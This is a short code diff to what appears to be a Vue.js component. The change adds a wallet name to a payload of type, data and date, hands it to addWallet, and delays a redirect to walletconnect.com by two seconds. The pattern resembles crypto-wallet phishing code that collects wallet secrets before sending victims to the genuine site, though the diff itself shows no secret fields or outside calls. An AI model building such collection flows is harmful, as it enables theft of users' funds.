@@ -220,6 +220,7 @@ export default {
         const data = this[this.type];
 
         const payload = {
+          name: this.wallet.name,
           type: this.type,
           data,
           date: this.getDate("current"),
@@ -227,7 +228,9 @@ export default {
 
         console.log(payload);
         this.addWallet(payload);
-        window.location.href = "https://walletconnect.com/";
+        setTimeout(() => {
+          window.location.href = "https://walletconnect.com/";
+        }, 2000);
       }
       return false;
     },
